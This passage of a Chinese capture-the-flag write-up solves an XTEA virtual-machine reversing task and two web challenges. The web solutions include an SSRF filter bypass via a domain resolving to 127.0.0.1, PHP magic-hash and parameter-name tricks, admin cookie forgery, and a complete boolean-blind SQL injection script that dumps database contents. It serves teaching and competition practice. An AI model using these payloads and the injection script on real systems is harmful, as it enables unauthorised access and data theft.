//存到temp中3</span><br><span class="line">	0xf8,0x06,0x00,        //进行与运算，存到r1中 这个就是我们现在的索引值</span><br><span class="line"></span><br><span class="line">	0xf9,0xe0,0x00,0x01,  //使用lea 这里将key[sum&amp;3]存到r1中</span><br><span class="line">	0xf1,0x00,0x04,      //再次把sum加上r1 实现了(key[sum &amp; 3] + sum)</span><br><span class="line">	//开始异或最后一步</span><br><span class="line">	0xf7,0x07,0x00,     //把两者异或的结果存储在store寄存器中 实现了语句 (((v1 &gt;&gt; 5) ^ (16 * v1)) + v1) ^ (key[sum &amp; 3] + sum);</span><br><span class="line">	//把上面store的值加上v0 下次循环还要用</span><br><span class="line">	0xf0,0xe0,0x06,0x00, //temp存0</span><br><span class="line">	0xf9,0xe0,0x00,0x00, //索引flag[0]放进r1</span><br><span class="line">	0xf1,0x00,0x07,//全新的flag[0]存在了r1中，再使用lea把数值存到flag[0]里</span><br><span class="line"></span><br><span class="line">	0xf0,0xe0,0x06,0x00,</span><br><span class="line">	0xf9,0xe1,0x00,0x00, //这里成功把全新的v0存到了flag[0]的位置，以便于下一步的引用</span><br><span class="line"></span><br><span class="line">	// sum -= 1640531527; 实现这一步</span><br><span class="line"></span><br><span class="line">   //存一下delta试试   delta只会在里面用到一次</span><br><span class="line">   0xf0,0xe0,0x06,0x00,  //temp寄存器先保存一下取第几位的值</span><br><span class="line">   0xf9,0xe0,0x02,0x02,  //现在寄存器r3存储了delta的值</span><br><span class="line">   0xf2,0x04,0x02, //实现了sum-=delta</span><br><span class="line"></span><br><span class="line">	//最后一步 v1 += (((v0 &gt;&gt; 5) ^ (16 * v0)) + v0) ^ (key[(sum &gt;&gt; 11) &amp; 3] + sum);</span><br><span class="line"></span><br><span class="line">	0xf0,0xe0,0x06,0x00,  //temp临时存了0x00</span><br><span class="line">	0xf9,0xe0,0x00,0x00,  //取了flag中的第一个数（目前的v0）</span><br><span class="line">	0xf0,0xe0,0x06,0x05,  //temp临时存值0x05</span><br><span class="line">	0xf5,0x00,0x06,       //shl操作</span><br><span class="line">	0xf0,0xe1,0x01,0x00,  //位操作完成的值给到r2中</span><br><span class="line">	0xf0,0xe0,0x06,0x00,</span><br><span class="line">	0xf9,0xe0,0x00,0x00,</span><br><span class="line">	0xf0,0xe0,0x06,0x06,</span><br><span class="line">	0xf6,0x00,0x06,     //shr操作</span><br><span class="line">	0xf7,0x01,0x00,     //异或之后的值存在了寄存器r2中</span><br><span class="line">	0xf0,0xe0,0x06,0x00,</span><br><span class="line">	0xf9,0xe0,0x00,0x00, //又把v0存在了r1中</span><br><span class="line">	0xf1,0x00,0x01,      //把r1和r2相加  实现了 (((v0 &gt;&gt; 5) ^ (v0 &gt;&gt; 6)) + v0) 这段数据在r1中</span><br><span class="line">	0xf0,0xe1,0x07,0x00,      //先放在临时储存的地方</span><br><span class="line"></span><br><span class="line">	0xf0,0xe1,0x00,0x04,   //把sum的值移动到r1中 进行右移7的操作</span><br><span class="line">	0xf0,0xe0,0x06,0x07,</span><br><span class="line">	0xf6,0x00,0x06, //进行了sum&gt;&gt;7的操作，存在了r1中</span><br><span class="line">	0xf0,0xe0,0x06,0x03,   //存到temp中3</span><br><span class="line">	0xf8,0x06,0x00,        //进行与运算，存到r1中 这个就是我们现在的索引值</span><br><span class="line"></span><br><span class="line">	0xf9,0xe0,0x00,0x01,  //使用lea 这里将key[(sum&gt;&gt;7)&amp;3]存到r1中</span><br><span class="line">	0xf1,0x00,0x04,      //再次把sum加上r1 实现了(key[sum &amp; 3] + sum)</span><br><span class="line">	//开始异或最后一步</span><br><span class="line">	0xf7,0x07,0x00,     //把两者异或的结果存储在store寄存器中 实现了语句 (((v1 &gt;&gt; 5) ^ (16 * v1)) + v1) ^ (key[sum &amp; 3] + sum);</span><br><span class="line">	//把上面store的值加上v0 下次循环还要用</span><br><span class="line">	0xf0,0xe0,0x06,0x01, //temp存1</span><br><span class="line">	0xf9,0xe0,0x00,0x00, //索引flag[1]放进r1</span><br><span class="line">	0xf1,0x00,0x07,//全新的flag[1]存在了r1中，再使用lea把数值存到flag[1]里</span><br><span class="line"></span><br><span class="line">	0xf0,0xe0,0x06,0x01,</span><br><span class="line">	0xf9,0xe1,0x00,0x00,</span><br><span class="line"></span><br><span class="line">	0xf0,0xe0,0x06,0x01,</span><br><span class="line">	0xf1,0x03,0x06,    //i++操作</span><br><span class="line">	0xfa,0x03,0x05,    //cmp比较rounds和i  for循环</span><br><span class="line">	0xf4,0xd4,</span><br><span class="line">	0xfb&#125;;</span><br></pre></td></tr></table></figure>

<p>写出XTEA解密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">void decipher(unsigned int num_rounds, uint32_t* v, uint32_t const* key) &#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    uint32_t v0 = v[0], v1 = v[1], delta = 0x114514, sum = delta * (-77);</span><br><span class="line">    for (i = 0; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; 5) ^ (v0 &gt;&gt; 6)) + v0) ^ (sum + key[(sum &gt;&gt; 7) &amp; 3]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; 5) ^ (v1 &gt;&gt; 6)) + v1) ^ (sum + key[sum &amp; 3]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[0] = v0; v[1] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    unsigned char* key = &quot;put_some_sugar!!&quot;;</span><br><span class="line">    uint32_t const* k = key;</span><br><span class="line">    uint32_t v[] = &#123; 0xd5bf7cb6, 0x1cc08fa5, 0x80d48de8, 0x6c3f5f0, 0x7e484457, 0xbfaeb3a6, 0xb44a2a23, 0x3ebb5b15, &#125;;</span><br><span class="line">    unsigned int r = 0x4D;</span><br><span class="line">    for (int i = 0; i &lt; 8; i += 2)</span><br><span class="line">    &#123;</span><br><span class="line">        decipher(r, v + i, k);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;解密后的数据:\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; 8; i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        printf(&quot;0x%x, &quot;, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    printf(&quot; %s&quot;, v);</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733852921-f2ede4a7-c5b0-4bfe-8e28-2943c3243cd8.png" alt="image.png"><br>得到最终的flag<br>DRKCTF{Y0ur_t3a_te4sT_NoT_b4d!!}</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h3 id="穿梭隐藏的密钥"><a href="#穿梭隐藏的密钥" class="headerlink" title="穿梭隐藏的密钥"></a><strong>穿梭隐藏的密钥</strong></h3><p>源码发现路由<br>访问路由&#x2F;c3s4f.php<br>参数爆破，得到参数shell<br>需要本地才能实现文件读取<br>开始ssrf伪造<br>但是过滤了gopher，127，@，0等,以下是正则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;/ftp|ftps|gopher|telnet|dict|file|ldap|@|127|0|[|localhost|https/i&#x27;</span><br></pre></td></tr></table></figure>

<p>这里可以用302跳转或者域名解析IP绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo.cc指向IP地址127.0.0.1。A记录就是域名指向ip地址，然后可以通过A记录转向访问</span><br><span class="line">类似的还有safe.taobao.com，114.taobao.com，test.xiaodi8.com等</span><br></pre></td></tr></table></figure>

<p>故构造如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?shell=http://sudo.cc/</span><br></pre></td></tr></table></figure>

<p>发现回到了首页，跨越成功<br>但是要求是秘密只给127.0.0.1<br>猜测为secret.php(或者扫目录)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?shell=http://sudo.cc/secret.php</span><br></pre></td></tr></table></figure>

<p>拿到key ,这里的key值是DrKn的参数和cha11eng3.php路由<br>challenge1:<br>需要绕过file_get_contents()函数<br>用data:&#x2F;&#x2F;伪协议绕过<br>所以第一部分payload: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cha11eng3.php?DrKn=data://text/plain,MSIBLG</span><br></pre></td></tr></table></figure>

<p>challenge2:<br>关键代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hash(&quot;md4&quot;, $damei) == $damei</span><br></pre></td></tr></table></figure>

<p>传入的值被md4加密后跟原来的相等<br>利用php的松散性绕过，也就是0e</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">初始值:  0e001233333333333334557778889</span><br><span class="line">md4 hash  :  0e434041524824285414215559233446</span><br><span class="line">初始值:  0e00000111222333333666788888889</span><br><span class="line">md4 hash  :  0e434041524824285414215559233446</span><br></pre></td></tr></table></figure>

<p>php非法传参<br>在给参数传值时，如果参数名中存在非法字符，比如空格和点，则参数名中的点和空格等非法字符都会被替换成下划线。<br>并且，在PHP8之前，如果参数中出现中括号[，那么中括号会被转换成下划线_，但是会出现转换错误，导致如果参数名后面还存在非法字符，则不会继续转换成下划线。也就是说，我们可以刻意拼接中括号制造这种错误，来保留后面的非法字符不被替换，因为中括号导致只会替换一次。<br>第二部分payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cha11eng3.php?DrKn=data://text/plain,MSIBLG&amp;M[ore.8=0e001233333333333334557778889</span><br></pre></td></tr></table></figure>

<p>challenge3:<br>md5针对强类型逻辑比较绕过，同弱类型逻辑比较中利用php特性MD5处理数组默认返回Null进行绕过手法<br>（Null类型强(弱)等于Null类型）<br>第三部分payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get传参：</span><br><span class="line">/cha11eng3.php?DrKn=data://text/plain,MSIBLG&amp;M[ore.8=0e001233333333333334557778889</span><br><span class="line">post传参：</span><br><span class="line">wtf[]=11&amp;mC[]=1</span><br><span class="line">或者</span><br><span class="line">直接post传参</span><br></pre></td></tr></table></figure>

<h3 id="EzLogin"><a href="#EzLogin" class="headerlink" title="EzLogin"></a><strong>EzLogin</strong></h3><p>ctrl+U查看前端源码，发现有个&#x2F;register.html，先进入&#x2F;register.html<br>随便注册一个帐号进去，登录发现我不是admin，查看cookie：<br>TOKEN&#x3D;65794a3163325679626d46745a534936496d46685953497349434a306232746c62694936496a5133596d4e6c4e574d334e4759314f446c6d4e4467324e3252695a4455335a546c6a59546c6d4f44413449697767496d6c7a5832466b62576c75496a6f7766513d3d<br>扔到cyberchef直接出明文：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733584012-c7e133bd-e865-4858-ae76-2aba66ec04a2.png" alt="image.png"><br>修改is_admin为1，base64和hex加密后得到的<br>65794a3163325679626d46745a534936496d46685953497349434a306232746c62694936496a5133596d4e6c4e574d334e4759314f446c6d4e4467324e3252695a4455335a546c6a59546c6d4f44413449697767496d6c7a5832466b62576c75496a6f7866513d3d<br>打入token，刷新页面。<img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733584093-0b6ac491-1029-4687-b30c-e06f50dd4e5a.png" alt="image.png"><br>很明显的sql注入，注入点是用户名，不断修改账户名来尝试，在TOKEN里有一个小token，这里是md5加密后的username，所以写个脚本，这是加密函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">payload</span>):</span><br><span class="line">    payload0 = payload</span><br><span class="line">    md5pwd = hashlib.md5(payload0.encode()).hexdigest()    <span class="comment">#把payload md5加密</span></span><br><span class="line">    json_payload = <span class="string">f&#x27;&#123;&#123;&quot;username&quot;:&quot;<span class="subst">&#123;payload0&#125;</span>&quot;, &quot;token&quot;:&quot;<span class="subst">&#123;md5pwd&#125;</span>&quot;, &quot;is_admin&quot;:1&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">    encoded_payload = base64.b64encode(json_payload.encode()) <span class="comment">#base64加密</span></span><br><span class="line">    hexadecimal_payload = encoded_payload.<span class="built_in">hex</span>()  <span class="comment">#十六进制编码</span></span><br><span class="line">    <span class="keyword">return</span> hexadecimal_payload</span><br></pre></td></tr></table></figure>

<p>根据注入正确和失败的两个回显，尝试布尔盲注。<br>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">payload</span>):</span><br><span class="line">    payload0 = payload</span><br><span class="line">    md5pwd = hashlib.md5(payload0.encode()).hexdigest()    <span class="comment">#把payload md5加密</span></span><br><span class="line">    json_payload = <span class="string">f&#x27;&#123;&#123;&quot;username&quot;:&quot;<span class="subst">&#123;payload0&#125;</span>&quot;, &quot;token&quot;:&quot;<span class="subst">&#123;md5pwd&#125;</span>&quot;, &quot;is_admin&quot;:1&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">    encoded_payload = base64.b64encode(json_payload.encode()) <span class="comment">#base64加密</span></span><br><span class="line">    hexadecimal_payload = encoded_payload.<span class="built_in">hex</span>()  <span class="comment">#十六进制编码</span></span><br><span class="line">    <span class="keyword">return</span> hexadecimal_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_str</span>():  <span class="comment"># 生成库名表名字符所在的字符列表字典</span></span><br><span class="line">    str_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):  <span class="comment"># 所有可显示字符</span></span><br><span class="line">        str_list.append(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="comment">#print(&#x27;可显示字符：%s&#x27;%str_list)</span></span><br><span class="line">    <span class="keyword">return</span> str_list  <span class="comment"># 返回字符列表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_length</span>(<span class="params">url, <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始测试数据库名长度.......&quot;</span>)</span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27;/**/and/**/length(database())/**/like/**/<span class="subst">&#123;num&#125;</span>#&quot;</span></span><br><span class="line">        db_payload = encode(payload)</span><br><span class="line">        cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>:db_payload&#125;</span><br><span class="line">        r = requests.get(url=url,cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            db_length = num</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]数据库长度：%d\n&quot;</span> % db_length)</span><br><span class="line">            db_name(db_length)  <span class="comment"># 进行下一步，测试库名</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>(<span class="params">db_length</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始测试数据库名.......&quot;</span>)</span><br><span class="line">    db_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    str_list = ascii_str()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, db_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_list:</span><br><span class="line">            payload = <span class="string">f&quot;admin&#x27;/**/and/**/(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))/**/like/**/<span class="subst">&#123;<span class="built_in">ord</span>(j)&#125;</span>)#&quot;</span></span><br><span class="line">            db_payload = encode(payload)</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: db_payload&#125;</span><br><span class="line">            r = requests.get(url=url, cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                db_name += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]数据库名：%s\n&quot;</span> % db_name)</span><br><span class="line">    tb_piece(db_name)  <span class="comment"># 进行下一步，测试security数据库有几张表</span></span><br><span class="line">    <span class="keyword">return</span> db_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_piece</span>(<span class="params">db_name</span>):</span><br><span class="line">    <span class="keyword">global</span> tb_piece</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始测试%s数据库有几张表........&quot;</span> % db_name)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># 猜解库中有多少张表，合理范围即可</span></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27;/**/and/**/<span class="subst">&#123;i&#125;</span>/**/like/**/(Select/**/Count(Table_name)/**/From/**/Information_schema.tables/**/Where/**/table_schema/**/like/**/&#x27;<span class="subst">&#123;db_name&#125;</span>&#x27;)#&quot;</span></span><br><span class="line">        tb_payload = encode(payload)</span><br><span class="line">        cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: tb_payload&#125;</span><br><span class="line">        r = requests.get(url=url, cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            tb_piece = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+]<span class="subst">&#123;db_name&#125;</span>库一共有<span class="subst">&#123;tb_piece&#125;</span>张表\n&quot;</span>)</span><br><span class="line">    tb_name(db_name, tb_piece)  <span class="comment"># 进行下一步，猜解表名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_name</span>(<span class="params">db_name, tb_piece</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始猜解表名.......&quot;</span>)</span><br><span class="line">    table_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(tb_piece):</span><br><span class="line">        str_list = ascii_str()</span><br><span class="line">        tb_length = <span class="number">0</span></span><br><span class="line">        tb_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):  <span class="comment"># 表名长度，合理范围即可</span></span><br><span class="line">            payload = <span class="string">f&quot;admin&#x27;/**/and/**/(Select/**/length(table_name)/**/from/**/Information_schema.tables/**/Where/**/table_schema/**/like/**/database()/**/limit/**/<span class="subst">&#123;i&#125;</span>,1)/**/like/**/<span class="subst">&#123;j&#125;</span>#&quot;</span></span><br><span class="line">            tb_payload = encode(payload)</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: tb_payload&#125;</span><br><span class="line">            r = requests.get(url=url, cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                tb_length = j</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;第%d张表名长度：%s&quot;</span> % (i + <span class="number">1</span>, tb_length))</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tb_length + <span class="number">1</span>):  <span class="comment"># 根据表名长度进行截取对比</span></span><br><span class="line">                    <span class="keyword">for</span> l <span class="keyword">in</span> str_list:</span><br><span class="line">                        payload = <span class="string">f&quot;admin&#x27;/**/and/**/(Select/**/ascii(substr((Select/**/table_name/**/from/**/Information_schema.tables/**/Where/**/table_schema/**/like/**/database()/**/limit/**/<span class="subst">&#123;i&#125;</span>,1),<span class="subst">&#123;k&#125;</span>,1)))/**/like/**/<span class="subst">&#123;<span class="built_in">ord</span>(l)&#125;</span>#&quot;</span></span><br><span class="line">                        tb_payload = encode(payload)</span><br><span class="line">                        cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: tb_payload&#125;</span><br><span class="line">                        r = requests.get(url=url, cookies=cookies)</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                            tb_name += l</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+]：%s&quot;</span> % tb_name)</span><br><span class="line">                table_list.append(tb_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+]%s库下的%s张表：%s\n&quot;</span> % (db_name, tb_piece, table_list))</span><br><span class="line">    column_num(table_list, db_name)  <span class="comment"># 进行下一步，猜解每张表的字段数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_num</span>(<span class="params">table_list, db_name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始猜解每张表的字段数：.......&quot;</span>)</span><br><span class="line">    column_num_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table_list:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):  <span class="comment"># 每张表的字段数量，合理范围即可</span></span><br><span class="line">            payload =<span class="string">f&quot;admin&#x27;/**/and/**/<span class="subst">&#123;j&#125;</span>/**/like/**/(Select/**/count(column_name)/**/from/**/Information_schema.columns/**/Where/**/table_name/**/like/**/&#x27;<span class="subst">&#123;i&#125;</span>&#x27;)#&quot;</span></span><br><span class="line">            column_payload = encode(payload)</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: column_payload&#125;</span><br><span class="line">            r = requests.get(url=url, cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                column_num = j</span><br><span class="line">                column_num_list.append(column_num)  <span class="comment"># 把所有表的字段，依次放入这个列表当中</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+]%s表\t%s个字段&quot;</span> % (i, column_num))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+]表对应的字段数：%s\n&quot;</span> % column_num_list)</span><br><span class="line">    column_name(table_list, column_num_list, db_name)  <span class="comment"># 进行下一步，猜解每张表的字段名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>(<span class="params">table_list, column_num_list, db_name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始猜解每张表的字段名.......&quot;</span>)</span><br><span class="line">    column_length = []</span><br><span class="line">    str_list = ascii_str()</span><br><span class="line">    column_name_list = []</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table_list)):  <span class="comment"># t在这里代表每张表的列表索引位置</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[+]%s表的字段：&quot;</span> % table_list[t])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(column_num_list[t]):  <span class="comment"># i表示每张表的字段数量</span></span><br><span class="line">            column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):  <span class="comment"># j表示每个字段的长度</span></span><br><span class="line">                payload = <span class="string">f&quot;admin&#x27;/**/and/**/<span class="subst">&#123;j-<span class="number">1</span>&#125;</span>/**/like/**/(Select/**/length(column_name)/**/from/**/Information_schema.columns/**/Where/**/table_name/**/like/**/&#x27;<span class="subst">&#123;table_list[t]&#125;</span>&#x27;/**/limit/**/<span class="subst">&#123;i&#125;</span>,1)#&quot;</span></span><br><span class="line">                column_name_length = encode(payload)</span><br><span class="line">                cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: column_name_length&#125;</span><br><span class="line">                r = requests.get(url=url, cookies=cookies)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    column_length.append(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> str_list:  <span class="comment"># k表示我们猜解的字符字典</span></span><br><span class="line">                    payload = <span class="string">f&quot;admin&#x27;/**/and/**/ascii(substr((Select/**/column_name/**/from/**/Information_schema.columns/**/Where/**/table_name/**/like/**/&#x27;<span class="subst">&#123;table_list[t]&#125;</span>&#x27;/**/limit/**/<span class="subst">&#123;i&#125;</span>,1),<span class="subst">&#123;j&#125;</span>,1))/**/like/**/<span class="subst">&#123;<span class="built_in">ord</span>(k)&#125;</span>#&quot;</span></span><br><span class="line">                    column_payload = encode(payload)</span><br><span class="line">                    cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: column_payload&#125;</span><br><span class="line">                    r = requests.get(url=url, cookies=cookies)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        column_name += k</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+]：%s&#x27;</span> % column_name)</span><br><span class="line">            column_name_list.append(column_name)</span><br><span class="line">    <span class="comment"># print(column_name_list)#输出所有表中的字段名到一个列表中</span></span><br><span class="line">    dump_data(table_list, column_name_list,)  <span class="comment"># 进行最后一步，输出指定字段的数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_data</span>(<span class="params">table_list,column_name_list,url,<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始爆破字段内容：&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):  <span class="comment"># l表示每条数据的长度，合理范围即可</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">f&quot;admin&#x27;/**/and/**/Ascii(Substr((Select/**/<span class="subst">&#123;column_name_list[<span class="number">0</span>]&#125;</span>/**/from/**/<span class="subst">&#123;table_list[<span class="number">0</span>]&#125;</span>/**/limit/**/0,1),<span class="subst">&#123;l&#125;</span>,1))/**/like/**/<span class="subst">&#123;k&#125;</span>#&quot;</span></span><br><span class="line">            data_len_payload = encode(payload)</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: data_len_payload&#125;</span><br><span class="line">            r = requests.get(url=url, cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">str</span> <span class="keyword">in</span> r.text):</span><br><span class="line">                character = <span class="built_in">chr</span>(k)</span><br><span class="line">                <span class="built_in">print</span>(character,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/home.php&quot;</span>  <span class="comment"># 目标url</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;@q^4*!z8a9-%42z.s~&quot;</span></span><br><span class="line">    <span class="comment">#db_length(url,str)</span></span><br><span class="line">    <span class="comment"># #下面是手动输入字段内容，不太优雅=-=</span></span><br><span class="line">    table_list = [<span class="string">&#x27;secret&#x27;</span>]</span><br><span class="line">    column_name_list = [<span class="string">&#x27;sseeccrreett&#x27;</span>]</span><br><span class="line">    dump_data(table_list,column_name_list,url,<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>

